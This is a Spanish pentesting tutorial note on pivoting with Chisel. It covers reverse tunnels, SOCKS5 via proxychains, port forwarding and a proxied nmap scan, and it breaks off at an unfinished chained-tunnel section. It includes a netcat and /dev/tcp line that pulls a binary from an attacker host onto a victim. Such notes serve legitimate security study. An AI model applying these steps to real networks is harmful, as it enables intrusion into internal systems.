
En este documento veremos como hacer una tunelizacion parcial (solo un puerto) o total (toda la conexión por TCP).
# Uso general

Chisel es una herramienta de tunelizacion TCP, en la cual tenemos clientes y servidores, vamos a hacer el caso mental de que tenemos una red con 3 maquinas, atacante, expuesta e interna:


![[roadmap.png]]


En este caso, facilmente podriamos tener acceso a la maquina expuesta utilizando ssh o una reverse shell, pero que pasa si queremos tener una reverse shell hasta la maquina interna?, en este caso necesitaremos de tunelizar la conexion para que llegue a nosotros.

Chisel utiliza una modalidad de cliente/servidor, en donde nosotros como atacantes estaremos a la escucha y la maquina expuesta (de la que tenemos control) se conectará a nosotros.


Es Importante entender la estructura basica de chisel:

### Server (Atacantes)

```shell
sudo chisel server --reverse -p 8080
```

### Cliente (Victima)

```shell
sudo chisel client {IP_SERVER}:{PUERTO_SERVER}  R:<NUEVO_PUERTO_ATACANTE›:<HOST_DESTINO›:<PUERTO DESTINO>
```


Lo que hace chisel es establecer un tunel, un tunel es una conexion
# Instalación

### En la maquina victima

Podemos encontrar un binario facilmente pasable [aquí](https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz) (Hay que descomprimirlo), y lo podemos pasar facilmente usando nc
#### Del lado del atacante:

```Shell
sudo nc -lvnp < chisel
```
####  Del lado de la victima:

```shell
cat < /dev/tcp/{IP_ATACANTE}/{PUERTO} > chisel
```

# Tunelización total (socks5)

### Configuración proxychains4

Para esto vamos a usar una conexión socks5, tenemos que asegurarnos que tenemos proxychains, y ademas, agregar la siguiente linea al final del archivo /etc/proxychains4.conf:

```shell
socks5 127.0.0.1 1080
```

### Chisel Use

#### Victima

```ruby
./chisel client {IP_ATACANTE}:{PUERTO} R:socks
```
#### Atacante

```ruby
chisel server --reverse -p {PUERTO}
```

#### Uso de tunelización

Ahora podemos usar proxychains, para que todos los paquetes del comando que usemos se redirijan usando socks5 hacia el objetivo, importante, si se va a usar Nmap, usarlo junto las opciones `-Pn -sT`:

```ruby
proxychains nmap -sT -Pn --min-rate 5000 -p- {IP}
```

# Tunelizacion parcial (Puerto especifico)

#### Victima

```ruby
./chisel client {IP_ATACANTE}:{PUERTO} R:8080:192.168.1.89:80
```

El puerto 8080 de nuestra maquina atacante se transforma en el puerto 80 del host destino (192.168.1.89)

#### Atacante

```ruby
chisel server --reverse -p {PUERTO}
```


# Tunelizacion concatenada


Para esto tenemos que mezclar socat y chisel, usaremos chisel para el cliente y el servidor, y socat para empujar las peticiones:

Antes



![[Pasted image 20260318102930.png]]


![[Pasted image 20260318103804.png]]


